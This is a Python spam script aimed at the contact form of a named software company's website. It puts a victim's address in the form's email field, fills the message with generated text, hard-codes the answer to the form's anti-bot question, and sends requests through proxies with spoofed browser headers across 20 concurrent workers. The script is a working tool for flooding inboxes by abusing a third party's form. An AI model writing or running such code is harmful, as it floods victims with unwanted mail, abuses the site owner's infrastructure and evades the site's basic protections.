from os.path import basename

import requests

from module import Spam

cookies = {
    '_ga': 'GA1.2.637541217.1677666330',
    '_gid': 'GA1.2.245515620.1677666330',
    '_gat': '1',
}

headers = {
    'authority': 'www.blipsoftware.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_ga=GA1.2.637541217.1677666330; _gid=GA1.2.245515620.1677666330; _gat=1',
    'origin': 'https://www.blipsoftware.com',
    'pragma': 'no-cache',
    'referer': 'https://www.blipsoftware.com/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'succesfully '


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(False)
        data = {
            'firstname': text,
            'email': target,
            'woord': 'seven',
            'message': text,
        }

        response = requests.post('https://www.blipsoftware.com/action.php', cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s, target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
